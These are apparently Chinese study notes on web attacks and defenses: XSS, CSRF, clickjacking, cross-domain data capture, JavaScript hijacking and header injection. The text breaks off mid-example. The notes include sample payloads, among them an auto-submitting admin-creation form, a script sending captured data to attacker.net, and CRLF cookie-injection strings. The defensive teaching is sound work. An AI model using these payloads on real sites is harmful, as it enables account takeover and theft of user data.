在提交输入请求时，如果存在多个参数，则应该为每个参数设计不同的值，这样才好判断具体是哪个参数，最终出现在哪个位置；如果所有参数值都相同，则很难判断，全部混在一起了； 在 Web 邮件应用程序中测试 XSSWeb 邮件应用程序由于需要接收第三方的内容，并展示在界面上以供用户查看，因此其天然存在保存型 XSS 漏洞的风险；最便捷的探查办法是创建一个自己的账户，然后自己给自己发送大量设计过攻击邮件，看攻击是否能够成功； 如果使用标准的邮件客户端，由于其自带内容净化功能，很可能导致无法将原始内容一字不变的发送出去，此时需要使用一些特殊的邮件发送工具来发送，例如 UNIX sendmail 命令； 12// 命令sendmail -t test@example.org &lt; email.txt 在 email.txt 文件中指定邮件内容 可根据需要使用不同的 content-type 和 charset，以避开目标服务器的过滤机制； 在上传文件中测试 XSS文件上传功能很常见，尤其是图片，常用于 UGC 内容和用户的头像中；该功能是否易于受到攻击，跟几个方面的因素有关： 上传时，是否有扩展名的限制； 上传时，是否有检查文件内容，以确认格式正确； 下载时，是否通过 content-type 消息头指定内容类型，例如 image&#x2F;jpeg； 下载时，是否通过 Disposition 消息头，指示浏览器直接保存文件到磁盘上，而非打开它； 测试方法：上传一个包含简单的概念验证脚本的文件，然后下载它，看是否会原样返回并执行脚本；如果会的话，则说明漏洞存在； 如果有扩展名限制，则尝试更换其他各种不同的扩展名，因此虽然扩展名与内容可能不同，但如果内容中包含 HTML，它仍然有可能被浏览器执行； 如果应用程序对文件内容进行检查，则可通过混合文件格式来避开，即在一个文件中包含部分指定类型的内容（如图片）；由于浏览器支持越来越多的可执行代码格式，因此混合文件内容的攻击原理仍然适用； 在通过 Ajax 上传的文件中测试 XSS URL 的片断标识符 # 用来对当前 URI 资源的某个局部进行标识，它常用的一个场景是可以记住某个位置，这样当用户在进入这个界面时，通过脚本，可以让页面滚动到指定的局部位置，而无须从头开始浏览； 由于片断标识符中的内容会被脚本加载，因为它可能存在 XSS 漏洞；攻击者通过在标识符内容中混入某个恶意文件，诱使用户点击，触发恶意文件的加载并执行；例如： 攻击者甚至可以在标识符内容中放入一个外部服务器的脚本，当用户点击链接时，会向某个攻击者控制的外部服务器发送请求，下载攻击者提前写好的恶意脚本文件； 查找并利用基于 DOM 的 XSS 漏洞 DOM 类型的漏洞与反射型漏洞的区别在于前者没有提供 HTML，而是通过将恶意代码混入请求参数来实现攻击； 常规探查办法：手动浏览应用程序的每个功能，并修改每一个参数，插入一个特殊的测试字符串，然后观察应用程序服务器返回的响应中，是否包含该字符串； 由于不知道应用程序的客户端脚本将如何处理参数和插入方式，使用常规的探查办法可能非常低效，更好的办法是主动阅读目标程序的客户端 JS 代码，了解其处理参数的逻辑，然后有针对性的对输入参数进行设计；已有不少现成的工具可以完成这一个过程，例如 DOMTracer； 渗透测试步骤： 在解析应用程序的过程中，检查客户端脚本是否调用 DOM API，如果有的话，再查看页面上是否参数被提交到页面中；常见的 API 如下： document.location document.URL document.URLUnencoded document.referer windown.location 检查 DOM API 的调用代码，了解其处理用户数据的方法，看是否可以使用针对性的输入来执行任意的 js ； 特别注意数据被传送到 document 的以下方法： document.write() document.writeln() document.body.innerHtml() eval() window.execScript() window.setInterval() window.setTimeout() 查看客户端的脚本中是否有过滤的代码，如果有的话，了解其过滤机制，以设计避开的办法； 有时候，服务端本身也对输入进行过滤，以避免 DOM 攻击；此时，需要使用前面提到的各种方法，探查服务器的机制； 有些客户端脚本不是将参数解析成键值对，而是直接提取等号位置后面的内容，此时会有两个漏洞： 服务端很可能只会过滤已知属性，而不会过滤未知属性；因此，攻击者可以插入一个虚拟的参数键值对，避开服务端的过滤；同时利用客户端只提取等号右边内容的特点，让插入值被加载； 由于浏览器不会将片断符的内容提交给服务端，因此攻击可以将恶意内容插入在片断标识符之后；这样可避开服务端的检查，同时内容仍可被客户端加载； 如果客户端脚本对基于 DOM 的数据进行非常复杂的处理，通过静态代码分析很难了解其完整处理过程的话，可以尝试利用 js 调试器来动态监控脚本的执行情况，因为调试器可以很方便的设置断点，监视感兴趣的代码与数据； 防止 XSS 攻击防止反射型与保存型 XSS 漏洞反射型与保存型 XSS 漏洞的根本原因在于未对用户的输入进行严格的过滤和净化； 三重防御法 确认输入 数据长度限制 仅包含合法字符的白名单； 与一个特殊的正则表达式匹配； 对不同的字段应用不同的确认规则 确认输出如果用户提交的输入需要被复制到响应中的话，那些应该对这些内容进行严格的净化 对数据进行 HTML 编码，无谓数据出现在什么地方，无论什么字符； 避免在敏感位置插入用户可以控制的数据；如果一定需要，则应根据用户的输入的类型，插入由开发者提前设计好的内容，而不是复制并插入用户提交的内容； 对用户输入中出现的敏感字符进行转义； 输入和输出过滤结合可以带来双重保障，降低被攻击的风险，其中输出过滤必不可少；虽然这会带来一定的性能损失； 消除危险的插入点 避免在现有的 JS 代码中插入用户可控制的数据，包括 标签和事件处理器 避免在接受 URL 作为标签属性值嵌入用户输入； 在消息头中强制使用指定的编码类型，避免由请求参数或者用户输入进行指定； 允许有限的 HTML尽量避免接受由用户直接提交包含 HTML 的内容，如果实在必须支持，则应该严格控制用户可用的 HTML 标签子集，避免提供任何引入脚本的方法，例如使用白名单，仅允许特定的标签和属性；即使这样也仍然有风险，因为攻击者可以普通的常用属性中插入脚本；一般来说，较好的办法是找到某个成熟的框架，例如 AntiSamy ，用来过滤用户提交的输入； 另外一种办法是开发某种定制的中间语言，允许用户在输入中使用有限的中间语言，然后再由应用程序进行翻译； 防止基于 DOM 的 XSS 漏洞确认输入在客户端的脚本中，对用户输入进行过滤；同时在服务端对 URL 数据进行严格的确认，以检测出包含攻击脚本和恶意请求，过滤的方法包括： 查询字符串中只有一个参数； 参数名为 message，大小写敏感； 参数值仅包含字母或数字内容； 确认输出将用户可控制的 DOM 数据插入到文档中之前，应用程序应对其进行 HTML 编码，以便将一些危险的字符安全的显示在页面中，示例如下： 12345function sanitize (str) &#123; const d = document.createElement(&#x27;div&#x27;); d.appendChild(document.createTextNode(str)); return d.innerHTML;&#125; 13. 攻击其他用户：其他技巧诱使用户执行操作请求伪造 攻击者在无需知道受害者的 cookie 是什么，而是直接由浏览器添加该 cookie，在受害者客户端发起伪造的请求； 本站点请求伪造 OSRF：on site request forgery 利用输入可以出现在页面中的特点（即保存型 XSS 漏洞），在页面中插入一个伪造的请求，当用户（尤其是管理员用户）点击该设计好的 URL 链接时，发起一个请求（例如创建一名管理员用户），达到攻击目的 12345678910111213&lt;!--请求参数--&gt;type=question&amp;name=daf&amp;message=foo&lt;!--页面结构--&gt;&lt;tr&gt; &lt;td&gt;&lt;img src=&quot;/images/question.gif&quot;&gt;&lt;/td&gt; &lt;td&gt;daf&lt;/td&gt; &lt;td&gt;foo&lt;/td&gt;&lt;/tr&gt;&lt;!--开发者可能对 name 和 message 参数进行了过滤，但攻击可以针对 img 标签的 src 标签属性设计插入&quot;/admin/newUser.php?username=daf2&amp;password=0wned&amp;role=admin#&quot;，最后的 # 符号将终止原本的 .gif 后缀--&gt; 案例1：eBay 网站 攻击者创建一个拍卖品，吸引用户去点击查看它；攻击者在创建卖品时，会上传一个指向站外服务器的卖品图片链接；创建时，该链接是有效的，指向的内容确实是一张图片，从而可以通过 eBay 的检查机制； 卖品创建完成后，攻击品替换了链接中的内容，变成了一段脚本； 当受害者点击该链接时，会将恶意脚本下载到本地并执行； 该恶意脚本会代表受害者发起一个链接，对 eBay 上面另外一个卖品发起任意的报价； 渗透测试步骤 如果一个用户输入的数据，会显示在另外一名用户的界面上，则它除了可能存在保存型 XSS 漏洞外，还有可能存在 OSRF 型漏洞； 用户提交的数据被插入到某个 URL 或者路径中的时候，很有可能存在 OSRF 漏洞（除非应用程序设置字符白名单进行过滤） 如果发现 OSRF 漏洞， 则应该有针对性的设计 URL 请求作为攻击目标； 跨站点请求伪造 CSRF: cross site request forgery 攻击原理和示例攻击者通过创建一个看似无害的网站，然后放置一个指向目标网站的链接，诱使用户点击该链接，向目标网站发起请求，执行攻击者想要实现的恶意操作； 同源策略并不会阻止 A 网站向 B 网站发起请求，但是它会阻止 A 网站的脚本处理 B 网站的响应；因此，CSRF 是一种单向的攻击； 假设某个网站允许管理员用户发起一个请求来创建一名新用户，创建其设置的请求格式如下： 1234567POST /auto/390/NewUserStep2.ashx HTTP/1.1Host: mdsec.netCookie: SessionId=12346Content-Type: application/x-www-form-urleencodedContent-Length: 83realname=daf&amp;username=daf&amp;userrole=admin&amp;password=letmein1&amp;confirmpassword=letmein1 该请求由于以下三个方面的原因，导致其容易受到 CSRF 攻击 该请求可以执行特权操作； 该请求仅依靠 cookie 来追踪会话，没有其他令牌或者无法预测的值； 除 cookie 外，请求中的所有其他参数值都是可以预测的； 攻击者可以通过构建如下表单，诱使用户点击提交请求，达到攻击目的 123456789101112&lt;html&gt; &lt;body&gt; &lt;form action=&quot;https//mdsec.net/auth/390/NewUserStep2.ashx&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;realname&quot; value=&quot;daf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;usernmae&quot; value=&quot;daf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;userrole&quot; value=&quot;admin&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;letmein1&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;confirmpassword&quot; value=&quot;letmein1&quot;&gt; &lt;/form&gt; &lt;script&gt;document.forms[0].submit();&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 浏览器在发起跨域请求时，会自动带上目标网站的 cookie，导致攻击得以实现； 利用 CSRF 漏洞CSRF 漏洞常常出现在应用程序仅依赖 cookie 进行会话管理的场景； 渗透测试步骤 解析应用程序的功能； 找到某项仅依赖 cookie 来追踪用户会话的敏感功能，确认功能的请求参数可以提前确认，不包含无法预测的数据； 创建一个无需交互操作即可发起请求的 HTML 页面（GET 请求可使用 img 标签；POST 请求则使用隐藏表单）； 登录应用程序后，使用同一个浏览器加载该 HTML 页面，确认应用程序的反应，看它是否执行所需要的操作； 假设应用程序的某个管理功能，接受某个用户标识符的参数（如用户id），然后会查询数据库，返回与该用户相关的信息，并显示在界面上；由于该功能仅管理员可用，而管理员本来就具有查看权限，因此开发者通常情况下不会对该功能做 CSRF 防御； 假设该功能的某个参数中，存在 SQL 注入漏洞，那么攻击者就会很有兴趣诱使非管理员用户去点击某个 CSRF 链接，发起请求，利用 SQL 注入漏洞，实现想要的查询； CSRF 与登录案例2：家庭路由器 路由器通常有一个管理界面，上面有一些敏感操作，例如开放端口供外部访问；很多用户在购买路由器后，并不会修改上面的默认密码，而有不少设备厂家对设备使用通用密码，这使得攻击者可以提前知道默认密码是什么；如果用户之前登录过该路由器，攻击者可以设计一个看似无害的恶意 URL，诱使用户点击，之后向本地的路由器发起一个请求；该请求将携带之前用户登录时获得的令牌，从而路由器将接受攻击者的请求和参数，并进行处理； 案例3：文件上传与下载 某个应用程序提供文件上传和下载功能，由于文件是私有的，只能由上传者本人下载，因此开发者可能误以为该功能没有攻击的价值，从而没有设置足够的防御措施；攻击者可以设计第一个 URL，诱使用户点击，然后以攻击者提前注册好的账号密码登录目标网站；攻击者再设计第二个 URL，诱使用户点击，此时用户将以攻击者的身份，从而该网站上下载攻击者放置的恶意脚本文件，并执行它，实现攻击者的目标意图；(诱使受害者以攻击者的身份，下载攻击者上传的恶意文件) 防止 CSRF 漏洞防止 CSRF 漏洞的一个办法是避免仅依赖 cookie 来追踪用户的会话，而应该增加一个隐藏表单字段，存放一个无法预测的随机值；当用户发起请求时，需要一起发送该字段值；服务器结合 cookie 和该字段值来确认用户的身份； 某些应用程序将反 CSRF 令牌设置得过短，因为猜想攻击者如果使用蛮力攻击，短时间内提交过多无效令牌请求，那么请求程序将终止攻击者的会话，从而终止攻击。 以上思路虽然没错，但攻击者可以避开该方法，枚举所有可能的令牌值，然后分散放到不同用户的页面上，当某个链接被点击后，监控其服务端的响应，如果响应正常，则说明该令牌有效；之后攻击者就可以使用该令牌伪造用户身份发起请求； 由于 CSRF 是单向攻击，有些开发者使用多阶段操作，来规避漏洞，其思路是即使攻击者伪造了第一阶段的请求，由于用户会收到响应，并在第二阶段确认操作是否无误，这时候就会发现异常，那么理论上就可以避免攻击者在第一阶段发起的操作直接生效；实际上攻击者经常直接第二个请求，完全不管第一个；或者当用户点击恶意链接后，攻击者按先后顺序同时发出两个请求即可； 通过 XSS 突破 CSRF 防御如果某个应用程序存在 XSS 漏洞，那么极大概率 CSRF 的防御机制将失效，因为攻击者通过 XSS 漏洞可以读取到任何需要的令牌值； 除了反射型 XSS 漏洞外，因为利用该漏洞，首先需要发起一个请求，之后才能在响应中插入恶意代码；但如果此时有 CSRF 防御，那么意味着需要一个令牌才能让请求成功，于是这就变成了一个先有鸡还是先有蛋的问题； 如果应用程序存在任何保存型的 XSS 漏洞，那么攻击者可以利用这些漏洞直接突破 XSRF 防御； 由于 CSRF 防御令牌通常在整个会话期间都是一致的，这意味着如果有任何一个页面存在反射型 XSS 漏洞，同时缺少 CSRF 防御，那么攻击者就可以利用该漏洞取得令牌，让 CSRF 防御失效； 如果令牌与用户账号关联，而不是与会话关联，那么攻击者可以伪造表单，让受害者以自己的账号登录应用程序，下载恶意代码；然后假装意外退出账号，诱使受害者使用其自己的账号登录；由于恶意代码已经在本地运行，受害者在登录过程中和登录后都将受到攻击者的控制； 如果令牌与会话关联，但同时应用程序的 cookie 存在注入漏洞，那么攻击者将直接用自己的 cookie 和令牌替换受害者的 cookie 和令牌，下载恶意代码，之后的操作与上一步相同； CSRF 防御可以在一定程度上保护 XSS 漏洞，但作用只有一点点，安全的做法还是应该修复所有的 XSS 漏洞； UI 伪装UI 伪装的原理很简单，即攻击者的页面会使用 iframe 元素，将目标页面的内容加载到其中，这样该页面看起来像真的一样，以便能够诱使用户进行点击；但实际上，攻击者在该 iframe 元素上覆盖了一层透明层，用户看不见；当用户进行操作时，会误以为是在与目标程序进行交互，但实际是与攻击者设计的透明元素进行交互；虽然由于同源策略，攻击者无法读取令牌，但是透明元素向目标程序发起的请求，将自动携带有令牌，从而导致攻击者可以诱使用户做出一些该用户并不知情的操作； 攻击者还可以在其页面中设计各种诱使用户的操作，当用户进行操作时，攻击者使用脚本代码将这些操作传递到目标程序的页面，从而以用户的名义，向目标程序页面发送这些操作，并在用户不知情的情况下，最终向目标程序发起这些操作； 破坏 iframe 防御为了防止 UI 伪装攻击，开发者在自己的页面加载后，会运行一段代码，检查自己的页面是否被浏览器加载到了一个 iframe 中，如果是的话，就终止服务，重定向的报错页面； 123456&lt;!-- 检测并逃离 iframe 示例--&gt;&lt;script&gt; if (top.location != self.location) &#123; top.location = self.location; &#125;&lt;/script&gt; 攻击者有多种方法可以避开上面这种简单的防御办法，包括如下： 虽然攻击者的页面在顶层，控制着整个页面，因为攻击者可以有改变页面上一个变量的含义；当子 iframe 页面中的代码尝试访问这些变量时，会得不到预期的结果，例如: var location = 'foo'； 攻击者可以监听页面的 window.onBeforeUnload 事件，当页面加载后，就对目标程序的防御代码进行搜索和禁用；例如定义 sandbox 属性，从而禁用 iframe 页面中的脚本，同时保持 cookie 有效； 防止 UI 伪装通过使用 X-Frame-Options 消息头，可以指示浏览器不将当前页面加载到 irame 中，从而实现对 UI 伪装的防御；该属性支持两个值，其意义分别如下： deny：拒绝所将页面插入 iframe 的尝试； sameorigin：仅当前域名可插入，任何第三方域名都不用插入； 在测试是否存在 UI 伪装漏洞时，要同时检查一下移动设备的版本；因为移动设备上的表现经常跟 PC 端有所不同； 跨域捕获数据虽然同源策略可以限制 A 域的代码访问 B 域数据；但是仍然存在一些办法，可以实现这种访问； 通过注入 HTML 捕获数据攻击者可以利用应用程序提供的功能，在其他用户收到的响应中注入一段有限的 HTML；在这种情况下，就可以利用 HTML 注入条件，向攻击者所在的域发送页面中的敏感数据（因为此时是在受害者打开的页面中，受害者发起的请求，是在应用程序的域中，因此不受到同源策略的影响）； 12345678910&lt;!--假设应用程序通过设置隐藏表单进行 CSRF 防御，那么页面上一般会有如下的隐藏表单，用来发送令牌--&gt;&lt;form action=&quot;http://app.com/forward_email&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;nonce&quot; value=&quot;2230313740821&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Forward&quot;&gt; ...&lt;/form&gt;&lt;script&gt; var _StatsTRackerId=&#x27;AAE78RF27CB3210D&#x27;; ...&lt;/script&gt; 攻击者可以在该隐藏表单之前，找到一个插入点，注入以下文本： 由于该文本也是一段 HTML 标签，但没有结束，那么在注入后，浏览器将在等号之后的文本中，寻找下一个单引号，以便进行配对；从而使得攻击者有机会将等号之后的内容，下一个单引号之前的内容，纳为其可注入的链接的参数的一部分； 当受害者点击该图片链接时向攻击的域发起请求时，受害者页面上的隐藏表单内容，将作为请求参数的组成部分，发送给攻击者的域，从而使得攻击者捕获了隐藏表单中的令牌； 另外一种攻击方法是在隐藏表单之前，注入以下的文本： 由于该段文本是一段 HTML 标签的前半部分，但不包含结束标签；那么浏览器会一直往后寻找，直到找到配对的标签为止；那么原页面上的 form 起始标签将被忽略（相当于注释掉了），但表单中的内容仍然有效。此时隐藏表单相当于被修改了，原本表单是要向应用程序的域发起的请求，现在变成了向攻击者的域发起请求； 第二种攻击方法注入的是合法且有效的 HTML 子集，因此很可能会避开潜在的输入确认机制； 通过注入 CSS 捕获数据注入 HTML 的缺点在于注入内容中需要使用尖括号，因此会被常见的过滤机制删除或者进行 HTML 编码，从而使得注入失效；因此，攻击者会转而采用注入 CSS 内容，来达到攻击目的； 攻击者在邮件的主题行中，设置如下内容的标题 该内容在邮件中注入后变成如下： 12345678910111213141516171819&lt;html&gt; &lt;head&gt; &lt;title&gt;Wao Inbox&lt;/title&gt; &lt;/head&gt; &lt;body&gt; ... &lt;td&gt;&#123;&#125; *&#123;font-family: &#x27;&lt;/td&gt; ... &lt;form action=&quot;http://app.com/forward_email&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;nonce&quot; value=&quot;2230313740821&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Forward&quot;&gt; ... &lt;/form&gt; &lt;script&gt; var _StatsTRackerId=&#x27;AAE78RF27CB3210D&#x27;; ... &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 由于注入的内容为 CSS，并且单引号未结束，浏览器将继续往下寻找单引号进行配对（直到 script 的变量定义部分找到）；两个单引号之间的内容变成了 font-family 的属性值； 理论上 CSS 的属性值可以不需要使用单引号括起来，但为了避免在敏感数据之前出现分号，导致 CSS 属性值的长度被提前终止，未包含敏感数据，故在此处使用单引号，以便其和 script 中的引号进行配对，确认两个引号之间的内容包含了敏感数据； 在完成了以上注入动作后，敏感数据已经包含在 font-family 属性；接下来攻击者再在邮件内容中插入一段脚本（此段内容属于攻击者的域），去读取 font-family 属性值，放在某个图片的 src 属性中；当用户点击该图片时，将触发图片上的 src 请求，发送敏感数据到攻击者的服务器； 12345&lt;link rel=&quot;stylesheet&quot; href=&quot;https://wao-mail.com/inbox&quot; type=&quot;text/css&quot;&gt;&lt;script&gt; document.write(&#x27;&lt;img src=&quot;http://attacker.net/capture?&#x27; + escape(document.body.currentStyle.fontFamily) + &#x27;&quot;&gt;&#x27;);&lt;/script&gt; Javascript 劫持背景：虽然同源策略阻止 A 域的脚本读取 B 域的响应敏据，但是并没有限制 A 域可以包含来自 B 域的脚本代码，同时这些脚本代码允许在 A 域中执行；一种常见的使用场景是 A 引用 B 的静态脚本，例如 JQuery； 由于静态脚本代码本来是公开的，其中并不包含敏感数据，所以一般这种做法并不会带来危险；但是今天很多应用程序使用脚本代码来传输敏感数据，有些应用程序甚至还允许动态插入脚本，因此，攻击者从中可以找到一些漏洞机会； 函数回调假设某个应用程序在页面上引用某个脚本文件，来处理某个用户点击事件；当点击事件发生时，会执行该脚本文件中的代码，向服务端发起用户信息请求，并在收到响应后，调用脚本中的 showUserInfo 回调函数来处理响应中的用户敏感数据； 针对以上情形，攻击者可以设计一个网页，在其中隐蔽放上一个诱使用户进行点击的链接，同时引用目标程序的脚本，但自定义一个自己的 showUserInfo 函数；当点击发生时，引用的脚本会向目标程序请求用户数据；如果在点击之前，用户恰好已对登录过目标程序，则该请求将是有效的；得到响应后，由于回调函数已经被攻击者定义的函数覆盖，响应将由攻击者定义的脚本进行处理，从而捕获用户的敏感数据； 有个困惑：攻击者引用目标程序脚本并覆盖回调函数，该脚本向目标网站 B 域发起请求，那么返回的响应是否能够被攻击者设计的网页 A 域进行处理？ 1234&lt;script&gt; function showUserInfo (x) &#123; alert(x); &#125;&lt;/script&gt;&lt;script src=&quot;https://target_app.net/source.ashx&quot;&gt;&lt;/script&gt; JSON应用程序经常使用 JSON 作为数据的传输格式，JSON 本质上是一堆字符串，因此浏览器在接收到该字符串后，需要对其进行解析；攻击者可以在自定义页面中，对 Javascript 内置数据类型的构造函数进行修改，从而改变解析 JSON 的结果 12345678910&lt;!--攻击者在自定义页面中重置 Array 构造函数--&gt;&lt;script&gt; function capture(s) &#123; alert(s); &#125; function Array() &#123; for (var i = 0; i &lt; 5; i++) &#123; this[i] setter = capture; &#125; &#125;&lt;/script&gt;&lt;script src=&quot;https://target_app.net/source.ashx&quot;&gt;&lt;/script&gt; 变量为了提高用户体验，很多开发者会使用 AJAX 向服务端请求数据，并在前端使用脚本处理响应，更新局部网页；假设应用程序在响应中的某个变量放置了临时令牌，用来反 CSRF；那么攻击者可以自定义网页中先引用应用程序的公开脚本，然后再定义自己的脚本去读取该变量，捕获敏感数据； 12345678&lt;!--假设应用程序的脚本中，定义了如下变量用于保存临时令牌--&gt;...nonce = &#x27;adfa313EFAa00eEF#2j&#x27;;...&lt;!--攻击者可以在引用应用程序的脚本后，再自定义函数捕获该变量--&gt;&lt;script src=&quot;https://target_app.com/status&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(nonce)&lt;/script&gt; 变量可能在脚本中的不同位置进行定义，存在作用域的问题；因此攻击者需要了解应用程序脚本内部的逻辑，并进行模仿，以便能准确捕获； E4XE4X 是指 ECMAScript 进行扩展，增加了对 XML 的支持，但这种支持也引入了新的漏洞；例如 E4X 允许在 Javascript 中直接使用 XML 语法，同时还允许在 XML 中嵌入代码； 1var foo = &#x27;&lt;bar&gt;&#123; prompt(&quot;Please enter the value of bar&quot;) &#125;&lt;/bar&gt;&#x27;; 这种特性存在两个漏洞： XML 标签将被注释成为值，导致原本的逻辑失效； { } 块中的文本由于作为 javascript 代码执行，因此可用来对 XML 数据进行初始化； 攻击者可以适当的位置注入文本，插入任意的 {...} 块，用于捕获敏感数据； 防止 Javascript 劫持 使用令牌，进行 CSRF 防御； 在引用脚本中故意引入无效或有问题的 Javascript 代码（例如无限循环），从而破坏攻击者的引用；而实际的动态代码会使用 XMLHttpRequest 对问题脚本进行预处理，删除其中的问题代码； 使用 POST 请求来获得动态脚本代码，而不是传统的 GET 请求；这样可以避免攻击者使用 script 标签引用脚本； 同源策略深入讨论同源策略与浏览器扩展大多数浏览器扩展都会实施一定程度的同源策略，但是它们之间还是存在一些轻微的区别，有时候这种区别会引入一些不易察觉的漏洞； 同源策略与 FlashFlash 有个特性，即它的源是由加载 Flash 对象的 URL 所有在域决定的，而不是由加载 Flash 对象的 HTML 页面的 URL 决定的；例如在 A 网站的 HTML 页面，加载了 B 网站的 Flash 对象，则该 Flash 对象的源指向 B 网站；该 Flash 对象会与同一来源的对象或者后端进行交互，同时还可以调用浏览器的 URLRequest API 提出跨域请求（但不能读取响应）； Flash 有另外一个特征，即对象源可以通过发布策略文件，对来自其他域的 Flash 对象进行授权，以完成双向的交互；当某个来源于 A 网站 Flash 对象，尝试对 B 网站发起跨域请求时，浏览器会检查 B网站的策略文件，看是否接受来自 A 网站的请求； 策略文件一般放在根目录下的 crossdomain.xml 文件中 渗透测试步骤： 不管目标程序是否使用 Flash，都应该检查一下 crossdomain.xml 文件，因为通常在该文件中存放着跨域的策略；如果目标程序 A 有在该文件中向域 B 授权，那么来自域 B 的 Flash 对象有权与 A 进行交互； 如果文件中的策略为 allow-access-from domain=“*”，则意味着应用程序允许无限制的访问，任何其他站点都可以和应用程序执行双向交互，控制用户的会话，检索全部的数据，执行任何用户的操作； 如果应用程序允许子域与其进行交互，那么攻击者可以利用子域上可能存在的 XSS 漏洞，来与父域进行交互；如果子域能够付费播放攻击者的 Flash 广告，那么攻击者就可以用其设计过的 Flash 对象来实现交互，读取数据； 策略文件中可能包含内网的主机名等一些对攻击者非常有帮助的信息； 目前大多数 Web 程序都没有在 /crossdomain.xml 路径存放策略文件，开发者假设没有该文件意味着自动禁止所有的跨域访问。但实际上，Flash 浏览器的行为并不是这样的，当它在默认的顶级位置找不到策略文件时，如果有指定其他的下载 URL 路径，那么它会到该路径下面去寻找；当该路径的响应确实是一个 XML 格式的文件，并且在 content-type 消息头中也备注了是 XML 类型，那么浏览器就会接受该文件；这意味着，如果应用程序存在某个功能，允许用户上传文件到其域中，那么攻击者就可以先上传自定义的策略文件到应用程序中，然后在 Flash 对象中指定访问该上传路径，读取到其上传的策略文件，得到授权； 同源策略与 SilverlightSilverlight 的源认定跟 Flash 是一样的，那由加载对象的 URL 所在的域决定；但 Silverlight 有一点比 Flash 宽松，即它在源认定中不限制协议和端口，这意味着只要是相同域名就可以了，HTTP 还是 HTTPS 无所谓，不同端口号也无所谓； Silverlight 的跨域策略文件位置为 /clientaccesspolicy.xml，以下示例是微软家的： Flash 的潜在漏洞点，同样也适用于 Silverlight 同源策略与 JavaJava 的同源策略有一个特点，即在某些情况下，与来源域共享 IP 地址的其他域，将被视为“同源”；因此，如果有多个应用程序共享主机，会产生跨域交互的可能； Java 不限制一个域发布自己与其他域进行交互的策略； 同源策略与 HTML5XMLHttpRequest 一开始仅允许提出同源的请求，但 H5 引入了新的规则，使其可以和任意域进行交互，只要该域为当前访问提供了权限即可；权限控制通过 HTTP 消息头的多个字段来实现； 常规请求（使用现有 HTML 生成的请求，如表单），浏览器将直接发出请求，并检查响应，看是否允许后续的脚本读取该响应的内容； 非常规请求（非 HTML 生成的请求，如 JS ），浏览器先向目标 URL 提出一个 OPTIONS 请求，然后检查消息头，看权限如何设置，然后再决定是否发出该非常规请求（即发请求前，先做一个确认的动作）； 不管哪种情况，浏览器在提出请求时，都会在请求的消息头中，将 Origin 字段值设置为提出请求的域，以便目标 URL 的服务器能够依据该值，告知授权情况；服务器会在响应中的 Access-Control-Allow-Origin 字段中，指定其允许访问的来源域； 如果是 OPTIONS 确认请求，目标服务器还会返回更多的字段信息，以便进行更加精细化的权限控制，包括如下几个字段： 渗透测试步骤： 向目标应用程序发起一个包含 Origin 消息头的 XMLHttpRequest 请求，检查其响应，看看其中的 Access-Control 字段的值是如何设置的； 如果支持跨域访问，再发一个 OPTIONS 请求，检查其具体的规则； XMLHttpRequest 的这种跨域新特性引入了新的漏洞；假设攻击者知道目标程序使用 XMLHttpRequest 来发请求，并动态提取响应结果，插入到 HTML 页面中的某个位置；那么攻击者可以先插入一个指向自己控制的服务器的 URL，诱使用户进行点击；然后在自己的服务器上放上相应的恶意文件，等待用户点击后下载，被目标程序提取，插入到页面中； 通过代理服务合并域有些 Web 应用程序的功能，实际是在扮演中介的作用；当用户发出某个请求时，它实际上是去其他第三方网站搜索查询，处理后再展示用户，例如很多在线网页翻译程序，它允许用户提交一个网站的 URL，然后它会去抓取该 URL 页面的内容，并将其翻译成指定的语言； 由于翻译程序不会修改源网页的 HTML 标签和 JS ，这时候会出现一个有趣的现象，即对于浏览器来说，页面上的所有内容都隶属于应用程序，但页面内容中实际上包含着来自外部网站的代码；如果用户通过 GT 访问两个域的内容，对于浏览器来说，它们都属于 GT 域；因此，原来来自两个域的代码是不能相互访问的，但是由于现在它们都隶属于 GT 名下，因此，从某种意义上来说，它们变成了同源的，因此，彼此之间可以相互访问；假设其中一个域包含公开、无须登录即可访问的内容，那么攻击者就可以利用这种间接机制，实现跨域的访问； 其他客户端注入攻击HTTP 消息头注入如果应用程序某个功能使用用户的输入，做为某个消息头字段值的话，那么就可能存在消息头注入漏洞（尤其是当攻击者能够注入换行符时，就可以随心所意插入任意消息头了）； 常见的两个注入位置出现在 Location 和 Set-Cookie 字段，前者提取用户输入进行重定向，后者提取用户输入做为偏好存储（例如存储用户的界面语言选项）； 123456GET /settings/12/Default.aspx?Language=Enghtlish HTTP/1.1Host: app.comHTTP/1.1 200 OKSet-Cookie: PreferedLanguag=English... 利用消息头注入漏洞探查消息头注入漏洞的方法，跟探查 XSS 漏洞的方法类似，就是查找用户输入是否会出现在响应的消息头中； 渗透测试步骤： 如果用户输入会被提取到响应的消息头中，那么确认应用程序是否接受 URL 编码的回车符（%0d）或者换行符（%0a），以及它们是否会原样在响应中返回； 在确认换行是否在响应中注入成功时，应注意此时换行符不再以 URL 编码的形式出现了，而是被解码后的样子，即报文相应的位置正常应该出现换行； 如果响应中仅返回两个换行符的一个，仍然可以设计出有效的注入方法； 如果换行符被服务端净化了，那么还有如下几种方法可以进行尝试： foo%00%0d%0abar：添加一个 null 字节； foo%250d%250abar：对百分号进行编码； foo%%0d0d%%0a0abar：后端有可能没有使用递归； 在查看注入是否成功时，除了 HTML 源代码和浏览器插件后，还应使用专门的拦截工具，对响应消息头进行分析，确保注入成功，避免忽略了实际已经成功的可能； 注入 cookie假设目标程序存在 cookie 注入漏洞，则攻击者可以设计一个 URL，在参数中包含要注入的 cookie 值；当用户点击该 URL 后，目标程序会根据收到的请求，返回相应的 cookie 给用户的浏览器，从而实际注入的目的； 12345678// 专门设计的 URLGET /setting/12/default.aspx?Language=English%0d%0aSet-Cookie:+SessId%3d120a12f98e8; HTTP/1.1Host: app.net// 目标程序的响应HTTP/1.1 200 OKSet-Cookie: 